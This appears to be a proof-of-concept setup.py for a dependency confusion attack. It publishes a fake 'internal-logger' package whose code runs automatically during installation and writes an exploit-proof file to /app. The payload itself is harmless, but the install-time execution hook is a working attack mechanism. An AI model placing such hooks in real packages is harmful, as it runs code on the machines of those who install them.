from setuptools import setup, find_packages
import os

# ⚠️ PAYLOAD MALVEILLANT ⚠️
# S'exécute pendant l'installation du package.
def execute_payload():
    payload_content = "SUCCESS: Dependency Confusion Exploited! Private code was executed."
    try:
        with open("/app/EXPLOIT_PROOF.txt", "w") as f:
            f.write(payload_content)
        print(f"[{os.getpid()}] DEPENDENCY CONFUSION SUCCESS: Wrote exploit proof to /app/EXPLOIT_PROOF.txt")
    except Exception as e:
        print(f"[{os.getpid()}] ERROR executing payload: {e}")

execute_payload()

setup(
    name='internal-logger',
    version='0.0.1',
    packages=find_packages(),
    description='Fake internal logger, designed to exploit dependency confusion.',
)
